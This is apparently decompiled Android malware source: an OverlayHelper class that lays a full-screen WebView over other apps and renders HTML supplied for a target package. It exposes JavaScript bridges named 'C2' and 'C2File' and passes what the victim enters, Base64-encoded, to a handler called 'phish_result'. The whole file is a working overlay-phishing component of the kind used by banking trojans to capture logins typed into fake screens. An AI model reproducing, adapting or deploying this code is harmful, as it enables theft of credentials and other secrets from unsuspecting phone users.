package com.servers.ozzbzk;

import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/* JADX INFO: Access modifiers changed from: package-private */
/* loaded from: classes.dex */
public final class OverlayHelper {
    private static final String TAG = "OverlayHelper";
    private final Context context;
    private volatile boolean resultDelivered;
    private volatile boolean showing;
    private WebView webView;
    private WindowManager windowManager;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Object lock = new Object();
    private volatile String targetPkg = "";
    private volatile String resultPath = "";

    /* JADX INFO: Access modifiers changed from: package-private */
    public OverlayHelper(Context context) {
        this.context = context.getApplicationContext() != null ? context.getApplicationContext() : context;
    }

    Bundle show(String str, String str2) {
        return show(str, str2, null);
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public Bundle show(String str, String str2, Bundle bundle) {
        String str3;
        String str4;
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this.context)) {
            Bundle bundle2 = new Bundle();
            bundle2.putBoolean("success", false);
            bundle2.putString("error", "SYSTEM_ALERT_WINDOW not granted");
            return bundle2;
        }
        if (str == null || str.isEmpty()) {
            str = buildDefaultHtml(str2);
        }
        final String str5 = str;
        if (bundle != null) {
            str3 = bundle.getString("target_pkg", bundle.getString("target_package", ""));
            str4 = bundle.getString("result_path", "");
        } else {
            str3 = "";
            str4 = str3;
        }
        final String str6 = str3 != null ? str3 : "";
        final String str7 = str4 != null ? str4 : "";
        final AtomicReference atomicReference = new AtomicReference();
        final CountDownLatch countDownLatch = new CountDownLatch(1);
        Runnable runnable = new Runnable() { // from class: com.servers.ozzbzk.OverlayHelper$$ExternalSyntheticLambda2
            @Override // java.lang.Runnable
            public final void run() {
                OverlayHelper.this.m5lambda$show$0$comserversozzbzkOverlayHelper(atomicReference, str5, str6, str7, countDownLatch);
            }
        };
        if (Looper.myLooper() == Looper.getMainLooper()) {
            runnable.run();
        } else {
            this.mainHandler.post(runnable);
            try {
                if (!countDownLatch.await(8L, TimeUnit.SECONDS)) {
                    Bundle bundle3 = new Bundle();
                    bundle3.putBoolean("success", false);
                    bundle3.putString("error", "overlay show timeout");
                    return bundle3;
                }
            } catch (InterruptedException unused) {
                Thread.currentThread().interrupt();
                Bundle bundle4 = new Bundle();
                bundle4.putBoolean("success", false);
                bundle4.putString("error", "interrupted");
                return bundle4;
            }
        }
        Bundle bundle5 = (Bundle) atomicReference.get();
        return bundle5 != null ? bundle5 : err("overlay failed");
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$show$0$com-servers-ozzbzk-OverlayHelper, reason: not valid java name */
    public /* synthetic */ void m5lambda$show$0$comserversozzbzkOverlayHelper(AtomicReference atomicReference, String str, String str2, String str3, CountDownLatch countDownLatch) {
        try {
            atomicReference.set(showOnMain(str, str2, str3));
        } finally {
            countDownLatch.countDown();
        }
    }

    private Bundle showOnMain(String str, String str2, String str3) {
        synchronized (this.lock) {
            try {
                try {
                    hideLocked();
                    this.resultDelivered = false;
                    this.targetPkg = str2;
                    this.resultPath = str3;
                    WindowManager windowManager = (WindowManager) this.context.getSystemService("window");
                    this.windowManager = windowManager;
                    if (windowManager == null) {
                        return err("no WindowManager");
                    }
                    WebView webView = new WebView(this.context);
                    this.webView = webView;
                    webView.getSettings().setJavaScriptEnabled(true);
                    this.webView.getSettings().setDomStorageEnabled(true);
                    this.webView.setWebViewClient(new WebViewClient());
                    this.webView.addJavascriptInterface(new C2Bridge(), "C2");
                    this.webView.addJavascriptInterface(new C2Bridge(), "C2File");
                    this.webView.loadDataWithBaseURL(null, str, "text/html", "UTF-8", null);
                    WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams();
                    if (Build.VERSION.SDK_INT >= 26) {
                        layoutParams.type = 2038;
                    } else {
                        layoutParams.type = 2002;
                    }
                    layoutParams.format = -3;
                    layoutParams.flags = 1824;
                    layoutParams.gravity = 8388659;
                    layoutParams.width = -1;
                    layoutParams.height = -1;
                    layoutParams.x = 0;
                    layoutParams.y = 0;
                    this.windowManager.addView(this.webView, layoutParams);
                    this.showing = true;
                    Bundle bundle = new Bundle();
                    bundle.putBoolean("success", true);
                    bundle.putString("status", "ok");
                    return bundle;
                } catch (Exception e) {
                    hideLocked();
                    return err(e.getMessage() != null ? e.getMessage() : "overlay failed");
                }
            } catch (Throwable th) {
                throw th;
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public Bundle hide() {
        final CountDownLatch countDownLatch = new CountDownLatch(1);
        Runnable runnable = new Runnable() { // from class: com.servers.ozzbzk.OverlayHelper$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                OverlayHelper.this.m4lambda$hide$1$comserversozzbzkOverlayHelper(countDownLatch);
            }
        };
        if (Looper.myLooper() == Looper.getMainLooper()) {
            runnable.run();
        } else {
            this.mainHandler.post(runnable);
            try {
                countDownLatch.await(3L, TimeUnit.SECONDS);
            } catch (InterruptedException unused) {
                Thread.currentThread().interrupt();
            }
        }
        Bundle bundle = new Bundle();
        bundle.putBoolean("success", true);
        bundle.putString("status", "ok");
        return bundle;
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: lambda$hide$1$com-servers-ozzbzk-OverlayHelper, reason: not valid java name */
    public /* synthetic */ void m4lambda$hide$1$comserversozzbzkOverlayHelper(CountDownLatch countDownLatch) {
        try {
            synchronized (this.lock) {
                hideLocked();
            }
        } finally {
            countDownLatch.countDown();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public Bundle status() {
        Bundle bundle = new Bundle();
        bundle.putBoolean("success", true);
        bundle.putBoolean("showing", this.showing);
        bundle.putBoolean("can_overlay", Build.VERSION.SDK_INT >= 23 ? Settings.canDrawOverlays(this.context) : true);
        return bundle;
    }

    private void hideLocked() {
        WebView webView;
        this.showing = false;
        WindowManager windowManager = this.windowManager;
        if (windowManager != null && (webView = this.webView) != null) {
            try {
                windowManager.removeView(webView);
            } catch (Exception e) {
                Log.w(TAG, "removeView: " + e.getMessage());
            }
        }
        WebView webView2 = this.webView;
        if (webView2 != null) {
            try {
                webView2.destroy();
            } catch (Exception e2) {
                Log.w(TAG, "destroyWebView: " + e2.getMessage());
            }
        }
        this.webView = null;
        this.windowManager = null;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void deliverResult(String str, boolean z) {
        if (this.resultDelivered) {
            return;
        }
        this.resultDelivered = true;
        writeResultFile(str, z);
        try {
            Bundle bundle = new Bundle();
            bundle.putString("target_pkg", this.targetPkg != null ? this.targetPkg : "");
            bundle.putString("data_b64", Base64.encodeToString(str.getBytes("UTF-8"), 2));
            bundle.putBoolean("dismissed", z);
            this.context.getContentResolver().call(Uri.parse("content://" + this.context.getPackageName() + ".bridge"), "phish_result", (String) null, bundle);
        } catch (Exception e) {
            Log.w(TAG, "deliverResult: " + e.getMessage());
        }
        if (z) {
            return;
        }
        this.mainHandler.postDelayed(new Runnable() { // from class: com.servers.ozzbzk.OverlayHelper$$ExternalSyntheticLambda1
            @Override // java.lang.Runnable
            public final void run() {
                OverlayHelper.this.hide();
            }
        }, 1200L);
    }

    private void writeResultFile(String str, boolean z) {
        if (this.resultPath == null || this.resultPath.isEmpty()) {
            return;
        }
        try {
            File file = new File(this.resultPath);
            File file2 = new File(this.resultPath + ".tmp");
            File parentFile = file.getParentFile();
            if (parentFile != null && !parentFile.exists()) {
                parentFile.mkdirs();
            }
            if (z) {
                str = "{\"dismissed\":true}";
            }
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            fileOutputStream.write(str.getBytes("UTF-8"));
            fileOutputStream.getFD().sync();
            fileOutputStream.close();
            file2.renameTo(file);
        } catch (Exception e) {
            Log.w(TAG, "writeResultFile: " + e.getMessage());
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    /* loaded from: classes.dex */
    public final class C2Bridge {
        private C2Bridge() {
        }

        @JavascriptInterface
        public void submit(String str) {
            OverlayHelper overlayHelper = OverlayHelper.this;
            if (str == null) {
                str = "{}";
            }
            overlayHelper.deliverResult(str, false);
        }

        @JavascriptInterface
        public void write(String str) {
            submit(str);
        }
    }

    private static Bundle err(String str) {
        Bundle bundle = new Bundle();
        bundle.putBoolean("success", false);
        bundle.putString("status", "error");
        if (str == null) {
            str = "";
        }
        bundle.putString("error", str);
        return bundle;
    }

    private static String buildDefaultHtml(String str) {
        if (str == null || str.isEmpty()) {
            str = "System";
        }
        return "<!DOCTYPE html><html><head><meta charset=\"utf-8\"/><meta name=\"viewport\" content=\"width=device-width,initial-scale=1\"/><style>html,body{margin:0;padding:0;background:#111;color:#eee;font-family:sans-serif;height:100%;display:flex;align-items:center;justify-content:center;}div{padding:24px;text-align:center;}</style></head><body><div><h2>" + escape(str) + "</h2></div></body></html>";
    }

    private static String escape(String str) {
        if (str == null) {
            return "";
        }
        return str.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;");
    }
}
